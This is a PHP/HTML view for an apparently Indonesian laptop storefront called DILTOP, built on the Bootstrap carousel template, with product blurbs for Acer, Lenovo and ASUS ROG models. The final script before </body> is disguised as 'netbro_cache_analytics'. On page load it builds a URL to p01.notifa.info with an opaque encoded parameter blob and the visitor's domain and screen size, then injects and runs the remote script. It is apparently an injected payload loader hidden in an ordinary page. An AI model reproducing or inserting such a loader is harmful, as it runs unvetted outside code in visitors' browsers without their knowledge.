<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="icon" href="../../favicon.ico">

  <title>Carousel Template for Bootstrap</title>

  <!-- Bootstrap core CSS -->
  <link href="<?php echo base_url('assets/css/bootstrap.min.css'); ?>" rel="stylesheet">

  <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <link href="<?php echo base_url('assets/ie10-viewport-bug-workaround.css'); ?>" rel="stylesheet">

  <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
  <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
  <script src="<?php echo base_url('assets/ie-emulation-modes-warning.js'); ?>"></script>

  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Custom styles for this template -->
    <link href="<?php echo base_url('assets/carousel.css'); ?>" rel="stylesheet">
  </head>
<!-- NAVBAR
  ================================================== -->
  <body>
    <div class="navbar-wrapper">
      <div class="container">

        <nav class="navbar navbar-inverse navbar-static-top">
          <div class="container">
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
              <a class="navbar-brand" href="#">DILTOP</a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
              <ul class="nav navbar-nav">
                <li class="active"><a href="#">Home</a></li>
                <li><a href="<?= base_url(); ?>index.php/About">About</a></li>
                <li><a href="#contact">Contact</a></li>
                
                <!-- <li class="dropdown">
                  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Dropdown <span class="caret"></span></a>
                  <ul class="dropdown-menu">
                    <li><button type="button" class="btn btn-outline-light">Log In</button></a></li>
                    <li><a href="#">Another action</a></li>
                    <li><a href="#">Something else here</a></li>
                    <li role="separator" class="divider"></li>
                    <li class="dropdown-header">Nav header</li>
                    <li><a href="#">Separated link</a></li>
                    <li><a href="#">One more separated link</a></li> -->
              </ul>
              <ul class="nav navbar-nav navbar-right">
                <li><a href="<?= base_url(); ?>index.php/Welcome/Login" class="btn btn-default">Log In</a></li>
                <li>  </li>
                <li>  </li>
            </ul>      

            </div>
          </div>
        </nav>
      </div>
    </div>

    <!-- Carousel
      ================================================== -->
      <div id="myCarousel" class="carousel slide" data-ride="carousel">
        <!-- Indicators -->
        <ol class="carousel-indicators">
          <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
          <li data-target="#myCarousel" data-slide-to="1"></li>
          <li data-target="#myCarousel" data-slide-to="2"></li>
        </ol>
        <div class="carousel-inner" role="listbox">
          <div class="item active">
            <img class="first-slide" src="data:image/gif;base64,R0lGODlhAQABAIAAAHd3dwAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==" alt="First slide">
            <div class="container">
              <div class="carousel-caption">
                <h1>Example headline.</h1>
                <p>Note: If you're viewing this page via a <code>file://</code> URL, the "next" and "previous" Glyphicon buttons on the left and right might not load/display properly due to web browser security rules.</p>
                <p><a class="btn btn-lg btn-primary" href="#" role="button">Sign up today</a></p>
              </div>
            </div>
          </div>
          <div class="item">
            <img class="second-slide" src="data:image/gif;base64,R0lGODlhAQABAIAAAHd3dwAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==" alt="Second slide">
            <div class="container">
              <div class="carousel-caption">
                <h1>Another example headline.</h1>
                <p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</p>
                <p><a class="btn btn-lg btn-primary" href="#" role="button">Learn more</a></p>
              </div>
            </div>
          </div>
          <div class="item">
            <img class="third-slide" src="data:image/gif;base64,R0lGODlhAQABAIAAAHd3dwAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw==" alt="Third slide">
            <div class="container">
              <div class="carousel-caption">
                <h1>One more for good measure.</h1>
                <p>Cras justo odio, dapibus ac facilisis in, egestas eget quam. Donec id elit non mi porta gravida at eget metus. Nullam id dolor id nibh ultricies vehicula ut id elit.</p>
                <p><a class="btn btn-lg btn-primary" href="#" role="button">Browse gallery</a></p>
              </div>
            </div>
          </div>
        </div>
        <a class="left carousel-control" href="#myCarousel" role="button" data-slide="prev">
          <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
          <span class="sr-only">Previous</span>
        </a>
        <a class="right carousel-control" href="#myCarousel" role="button" data-slide="next">
          <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
          <span class="sr-only">Next</span>
        </a>
      </div><!-- /.carousel -->


    <!-- Marketing messaging and featurettes
      ================================================== -->
      <!-- Wrap the rest of the page in another container to center all the content. -->

      <div class="container marketing">

        <!-- Three columns of text below the carousel -->
        <div class="row">
          <div class="col-lg-4">
            <img class="img-circle" src="<?php echo base_url('pict/laptop1.png'); ?>" alt="Generic placeholder image" width="140" height="140">
            <h2>Acer Aspire ES1-432</h2>
            <p>Laptop Acer seri ES ini didukung dengan prosesor Quad-Core N4200 berkecepatan 1.10 GHz berukuran layar 14 inch,Pentium Quad Core, Celero, DDR3L SDRAM, 4GB, 2GB, HD</p>
            <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
          </div><!-- /.col-lg-4 -->
          <div class="col-lg-4">
            <img class="img-circle" src="<?php echo base_url('pict/laptop2.png'); ?>" alt="Generic placeholder image" width="140" height="140">
            <h2>Lenovo Ideapad 100 14</h2>
            <p>Attractive price, amazing performance, and ultra-slim, highly mobile design. Celeron, Core i3. DDR3L, 4GB, 2GB, HDD, 500GB. 14 inches, Windows 8.1</p>
            <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
          </div><!-- /.col-lg-4 -->
          <div class="col-lg-4">
            <img class="img-circle" src="<?php echo base_url('pict/laptop3.png'); ?>" alt="Generic placeholder image" width="140" height="140">
            <h2>Acer Aspire V5-471-323B2G50Ma</h2>
            <p>Core i3, 1.4 GHz. DDR3, 2GB, HDD, 500GB. 14" HD Acer CineCrystal™</p>
            <p><a class="btn btn-default" href="#" role="button">View details &raquo;</a></p>
          </div><!-- /.col-lg-4 -->
        </div><!-- /.row -->


        <!-- START THE FEATURETTES -->

        <hr class="featurette-divider">

        <div class="row featurette">
          <div class="col-md-7">
            <h2 class="featurette-heading">ROG Strix GL503
              <span class="text-muted">QUENCH YOUR THIRST FOR VICTORY</span></h2>
              <p class="lead">Dengan prosesor Intel® Core™ generasi ke-8 terbaru dan grafis NVIDIA® GeForce® GTX 10-Series, ROG Strix GL503 memiliki semua alat yang diperlukan untuk meningkatkan level permainan Anda. Laptop gaming esports ini memiliki sistem Anti-Dust Cooling (ADC) terdepan untuk mengatasi tuntutan maraton gaming yang melelahkan, sementara pencahayaan Aura Sync memungkinkan Anda menyesuaikan warna dari seluruh pengaturan game Anda. Jadi bersiaplah untuk pertempuran! </p>
            </div>
              <div class="col-md-5">
                <img class="featurette-image img-responsive center-block" src="<?php echo base_url('pict/laptop4.png'); ?>" alt="Generic placeholder image">
              </div>
          </div>

          <hr class="featurette-divider">

          <div class="row featurette">
            <div class="col-md-7 col-md-push-5">
              <h2 class="featurette-heading">ROG ZEPHYRUS (GX501)
                <span class="text-muted">DEFINING ULTRA-SLIM GAMING</span></h2>
              <p class="lead">ROG Zephyrus merupakan sebuah revolusi gaming laptop, lahir berkat dedikasi untuk melahirkan sebuah inovasi. Walaupun terbilang sangat tipis daripada laptop ROG sebelumnya, hardware yang digunakan mampu menyaingi high-end gaming desktops: NVIDIA® GeForce® GTX 1080 graphics dengan Max-Q desain, prosesor generasi ke-8 Intel® Core™, layar 120Hz dengan fitur G-Sync, serta Windows 10 Home. ROG membuat body nya tipis, memiliki ukuran hanya 16.9-17.9mm, dan tetap menjaga cooling yang bertenaga serta tetap sunyi. Teknologi pendingin terbaru, Active Aerodynamic System, merupakan pendingin generasi terbaru yang sangat membantu Zephyrus menghindari panas.</p>
            </div>
            <div class="col-md-5 col-md-pull-7">
              <img class="featurette-image img-responsive center-block" src="<?php echo base_url('pict/laptop5.png'); ?>" alt="Generic placeholder image">
            </div>
          </div>

          <hr class="featurette-divider">

          <div class="row featurette">
            <div class="col-md-7">
              <h2 class="featurette-heading">ROG GX800VH (7th Gen Intel Core)
                <span class="text-muted">DEFY CONVENTION. CHANGE THE GAME.</span></h2>
              <p class="lead">ASUS menciptakan ROG GX800 dengan tujuan untuk memberikan Anda laptop yang memiliki performa sama dengan desktop. ROG GX800 dilengkapi dengan Windows 10, kartu grafis NVIDIA® GeForce® GTX 1080 dengan konfigurasi SLI untuk tampilan gambar 4K yang tak tertandingi, dan dilengkapi dengan exclusive liquid-cooling dock untuk melakukan extreme overclocking pada kartu grafis, CPU dan DRAM. ROG GX800 hadir dengan keyboard MechTAG( Mechanical Tacticle Advanced Gaming) yang dilengkapi dengan fitur mechanical switches dan costumizable RGB LED.</p>
            </div>
            <div class="col-md-5">
              <img class="featurette-image img-responsive center-block" src="<?php echo base_url('pict/laptop6.png'); ?>" alt="Generic placeholder image">
            </div>
          </div>

          <hr class="featurette-divider">

          <!-- /END THE FEATURETTES -->


          <!-- FOOTER -->
          <footer>
            <p class="pull-right"><a href="#">Back to top</a></p>
            <p>&copy; 2016 Company, Inc. &middot; <a href="#">Privacy</a> &middot; <a href="#">Terms</a></p>
          </footer>

        </div><!-- /.container -->


    <!-- Bootstrap core JavaScript
      ================================================== -->
      <!-- Placed at the end of the document so the pages load faster -->
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
      <script>window.jQuery || document.write('<script src="<?php echo base_url('assets/js/jquery-3.3.1.min.js'); ?>"><\/script>')</script>
      <script src="<?php echo base_url('assets/js/bootstrap.min.js'); ?>"></script>
      <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
      <script src="<?php echo base_url('assets/holder.min.js'); ?>"></script>
      <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
      <script src="<?php echo base_url('assets/ie10-viewport-bug-workaround.js'); ?>"></script>
      <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mQXATpuRMaXV5owNaOr0Ie2biL5UIGIHWgkybrX%2b%2f4wkPNxietUjzBQCjViR6tULHtPfz9tI7f1bgR6l8jPQTEzlX6lWTas93J2BiwUlaUgJnwgm4JRZzd3DRVlqdQWnmdlqkkZ83Jc702s%2bBYCJmcQ6Ja5PU6MPvybx%2fuvSYc87RhlpBbRcEMZwRbLaIGYaRsIe6KFz695R%2bzvFCpXElvZQl3zBCyas%2fYm6XTrX4%2flSoIQ1j6gskE4gQE0IFM0WspRhV6jewzpoOVqwqcWcK2upFD4FsYj2Lpjdts%2fXv0l6C%2fgjxu%2fhdrZv%2faMP0Vqw0zNfsID4ipA8fJlpW1AfsmVUkqukaUMmsFl%2fTZtMVJDfwr1uE8aRarhSLYOsAfIQ3WwsW2Uft206nA3De11XWw5wLHxpHETb80iFP1LRcJHJuX9dC0rKoPFLWs1xM2a9EORkoQoPaWYl%2b2Ce0rnihDhRi1ORwVaOqwAXPRN2wORuszmU0w%2bQj4rV9Ko1XAWR5EmvDCSO277pVkHYy8OOFsqFOPzT1tKB%2fj%2bR%2ffl84z6XdpJvi8oOLLXmHEt%2bI72y4B5nXx4%2bF34c%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
      </html>
